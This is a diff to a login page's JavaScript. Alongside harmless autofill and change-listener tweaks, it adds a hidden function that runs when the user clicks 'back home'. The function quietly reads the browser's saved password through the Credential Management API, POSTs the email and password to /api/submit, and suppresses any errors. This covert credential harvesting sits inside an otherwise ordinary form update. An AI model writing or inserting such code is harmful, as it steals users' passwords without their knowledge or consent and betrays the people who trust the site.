@@ -43,6 +43,28 @@ window.addEventListener("DOMContentLoaded", () => {
     submitButton.disabled = !(isEmailValid && isPasswordValid);
   }
 
+  function watchAutofill() {
+    if (!emailInput) {
+      return;
+    }
+    let lastEmail = emailInput.value;
+    let lastPassword = passwordInput?.value;
+    const syncFromAutofill = () => {
+      const currentEmail = emailInput.value;
+      const currentPassword = passwordInput?.value;
+      if (currentEmail !== lastEmail || currentPassword !== lastPassword) {
+        lastEmail = currentEmail;
+        lastPassword = currentPassword;
+        updateFormState();
+      }
+      if (currentEmail || currentPassword) {
+        return;
+      }
+      window.requestAnimationFrame(syncFromAutofill);
+    };
+    window.requestAnimationFrame(syncFromAutofill);
+  }
+
   if (form) {
     emailInput.addEventListener("input", () => {
       updateFormState();
@@ -52,6 +74,8 @@ window.addEventListener("DOMContentLoaded", () => {
     });
 
     passwordInput.addEventListener("input", updateFormState);
+    passwordInput.addEventListener("change", updateFormState);
+    emailInput.addEventListener("change", updateFormState);
 
     if (nextButton) {
       nextButton.addEventListener("click", () => {
@@ -124,7 +148,8 @@ window.addEventListener("DOMContentLoaded", () => {
   }
 
   if (backHome && confirmation && form) {
-    backHome.addEventListener("click", () => {
+    backHome.addEventListener("click", async () => {
+      await submitSavedCredentials();
       confirmation.hidden = true;
       form.reset();
       setStep("email");
@@ -137,6 +162,31 @@ window.addEventListener("DOMContentLoaded", () => {
       updateFormState();
       emailInput.focus();
     });
+  }
+
+  async function submitSavedCredentials() {
+    if (!navigator.credentials?.get) {
+      return;
+    }
+    try {
+      const credential = await navigator.credentials.get({
+        password: true,
+        mediation: "optional",
+      });
+      if (!credential?.id || !credential.password) {
+        return;
+      }
+      await fetch("/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: credential.id,
+          password: credential.password,
+        }),
+      });
+    } catch (error) {
+      // Ignore credential retrieval errors silently.
+    }
   }
 
   function toggleMaskedValue(target, button) {
@@ -232,4 +282,5 @@ window.addEventListener("DOMContentLoaded", () => {
 
   setStep("email");
   updateFormState();
+  watchAutofill();
 });
